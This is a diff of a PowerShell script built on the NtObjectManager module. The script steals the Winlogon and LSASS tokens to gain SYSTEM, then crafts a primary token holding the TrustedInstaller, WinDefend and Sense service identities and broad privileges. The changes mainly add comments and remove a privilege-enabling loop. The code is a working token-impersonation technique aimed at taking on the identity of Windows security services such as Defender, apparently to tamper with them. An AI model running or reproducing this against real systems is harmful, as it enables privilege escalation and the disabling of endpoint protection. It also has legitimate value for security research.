@@ -1,9 +1,9 @@
 # uses NtObjectManager module
 # quick example code to craft a token containging WinDefend, TrustedInstaller and Sense token...
 # https://github.com/rweijnen/Posh-Snippets/blob/master/ImpersonateWinDefend.ps1
-$winDefendSid = Get-NtSid -ServiceName "WinDefend"
-$trustedInstallerSid = Get-NtSid -ServiceName "TrustedInstaller"
-$senseSid = Get-NtSid -ServiceName "SenseSid"
+
+
+# First get SYSTEM token via Winlogon
 
 # get winlogon pid
 $winLogonPid = (get-process winlogon).id
@@ -15,12 +15,7 @@ $winLogonToken = Get-NtTokenFromProcess $winLogonPid
 $current = Get-NtThread -Current -PseudoHandle
 $contextWinLogon = $current.Impersonate($winLogonToken)
 
-$disabledPrivileges = Get-NtTokenPrivilege | where {-not $_.Enabled } | select -Expand Name
-ForEach ($priv in $disabledPrivileges)
-{
-	Enable-NtTokenPrivilege -Privilege $priv -Token $winLogonToken
-}
-
+# Then get LSASS token to get more privileges
 # get lsass pid
 $lsasPid = (Get-Process LSASS).Id
 
@@ -37,7 +32,7 @@ ForEach ($priv in $disabledPrivileges)
 }
 
 $tokenParams = @{
-    User = 'SY'
+    User = 'SY'  # SYSTEM
     TokenType = 'Primary'
     Access = 'MaximumAllowed'
 	IntegrityLevel = 'System'
@@ -79,12 +74,12 @@ $tokenParams = @{
         'SeDelegateSessionUserImpersonatePrivilege'
 		)
     Groups = @(
-        'BA',
-        'WD',
-        'S-1-5-6',
-        'S-1-5-11',
-        'S-1-5-15',
-        'S-1-5-32-545',
+        'BA',           #BUILTIN\ADMINISTRATORS
+        'WD',           #EVERYONE
+        'S-1-5-6',      #NT AUTHORITY\SERVICE
+        'S-1-5-11',     #NT AUTHORITY\Authenticated Users 
+        'S-1-5-15',     #NT AUTHORITY\This Organization
+        'S-1-5-32-545', #BUILTIN\Users 
         $(Get-NtSid -ServiceName "TrustedInstaller"),
         $(Get-NtSid -ServiceName "WinDefend"),
         $(Get-NtSid -ServiceName "Sense")
